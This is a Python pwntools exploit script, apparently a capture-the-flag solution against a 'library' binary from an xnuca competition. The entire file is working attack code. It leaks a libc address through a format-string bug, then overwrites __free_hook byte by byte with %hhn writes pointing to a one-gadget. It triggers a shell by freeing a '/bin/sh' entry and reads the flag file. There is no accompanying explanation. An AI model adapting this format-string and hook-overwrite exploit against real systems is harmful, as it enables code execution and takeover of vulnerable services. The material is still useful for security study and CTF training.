from pwn import *
import sys
context.proxy = (socks.SOCKS5, '10.114.1.10', 18888)
if len(sys.argv) < 2:
	p = process("./library")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./library")
else:
	p = remote(sys.argv[1],int(sys.argv[2]),timeout=2)
	libc = ELF("libc.so.6")
	elf = ELF("./library")

def chooseid(conti = True):
	if conti:
		p.sendlineafter("choose your id:\n","0")
	else:
		p.sendlineafter("choose your id:\n","1")

def addsection(section):
	p.sendafter("input section name\n",section["name"])
	p.sendafter("length:\n",str(section["length"]))
	p.sendafter("content:\n",section["content"])

def add(title,section):
	p.sendlineafter("4. exit\n","1")
	p.sendafter("title:\n",title)
	secnum = len(section)
	p.sendlineafter("How many sections\n",str(secnum))
	for i in range(secnum):
		addsection(section[i])

def check():
	p.sendlineafter("4. exit\n","2")

def free(name):
	p.sendlineafter("4. exit\n","3")
	p.sendafter("title:\n",name)

def bookexit():
	p.sendlineafter("4. exit\n","4")

def borrow(title):
	p.sendlineafter("4. exit\n","1")
	p.sendafter("want to borrow?\n",title)

def giveback(title):
	p.sendlineafter("4. exit\n","2")
	p.sendafter("give back?\n",title)
	
def readbook(title,take_note = False, section = ""):
	p.sendlineafter("4. exit\n","3")
	p.sendafter("read at library?\n",title)
	info = p.recvuntil("DO you want to",drop=True)
	if take_note:
		p.sendafter("take a note?\n","Y")
		for i in range(len(section)):
			addsection(section[i])
	else:
		p.sendafter("take a note?\n","N")
	return info

def debugf():
	#gdb.attach(p,"b *0x400CF8\nb *0x400D3D\nb *0x4014E0")
	gdb.attach(p,"b *0x4014E0")

def genpayload(index,value):
	payload = ""
	number_write = 0
	for i in range(8):
		num = (value&0xff - number_write)&0xff
		payload += "%{num}c%{index}$hhn".format(num=num,index=index+i)
	
#context.log_level = "debug"
#context.terminal = ["tmux","splitw","-v"]
#debugf()

context.timeout = 1
chooseid()
#payload = genpayload(8,)
add("1111",[{"name":"xnuca","length":0x20,"content":"%17$p"}])
bookexit()
chooseid(False)
info = readbook("1111",True,[{"name":"xnuca","length":0x20,"content":"%s"}])
leak_addr = int(info[info.find("0x"):info.find("xnuca")],16)
libc.address = leak_addr - libc.symbols["__libc_start_main"] - 240
log.success("libc_base:"+hex(libc.address))
value = libc.address + 0x45216
for i in range(8):
	bookexit()
	chooseid()
	if value&0xff == 0:
		payload = "%9$hhn"
	else:
		payload = "%{num}c%9$hhn".format(num=value&0xff)
	value = value >> 8
	add(str(i),[{"name":"xnuca","length":0x20,"content":payload}])
	bookexit()
	chooseid(False)
	readbook(str(i).ljust(8,"\x00")+p64(libc.symbols["__free_hook"]+i))
"""
for i in range(9):
	if i == 0:
		if value&0xff == 0:
			payload = "%9$hhn"
		else:
			payload = "%{num}c%9$hhn".format(num=value&0xff)
		value = value >> 8
		readbook("1111".ljust(8,"\x00")+p64(libc.symbols["__free_hook"]+i),True,[{"name":"xnuca","length":0x20,"content":payload}])
	else:
		if value&0xff == 0:
			payload = "%9$hhn"
		else:
			payload = "%{num}c%9$hhn".format(num=value&0xff)
		value = value >> 8
		readbook("1111".ljust(8,"\x00")+p64(libc.symbols["__free_hook"]+i-1),True,[{"name":"xnuca","length":0x20,"content":payload}])
"""
p.sendline("4")
chooseid()
add("/bin/sh",[{"name":"xnuca","length":0x20,"content":"%17$p"}])
free("/bin/sh")
p.sendline("cat /opt/xnuca/flag.txt")
try:
	res = p.recvuntil("}")
	print res
	if res[-1:]=="}":
		exit()
		p.close()
except Exception as e:
	p.close()
